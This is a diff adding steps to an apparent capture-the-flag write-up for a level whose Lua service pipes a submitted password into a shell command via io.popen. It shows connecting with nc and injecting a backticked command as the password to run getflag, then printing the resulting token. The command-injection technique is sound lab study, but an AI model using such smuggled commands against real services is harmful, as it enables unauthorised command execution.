@@ -7,3 +7,37 @@
 
 (The cat output is in the level11.lua file in this same directory)
 
+As we can see in the following line of the file :
+
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+It builds a shell command by pasting the value we send (pass)
+after echo, then executes that command.
+
+So let's try !
+
+-> nc 127.0.0.1 5151
+
+Password:
+
+-> getflag > /tmp/flag
+
+Erf nope..
+
+-> cat /tmp/flag
+
+getflag
+
+-> nc 127.0.0.1 5151
+
+Password:
+
+-> `getflag` > /tmp/flag
+
+Erf nope..
+
+-> cat /tmp/flag
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+-> su level12 ..
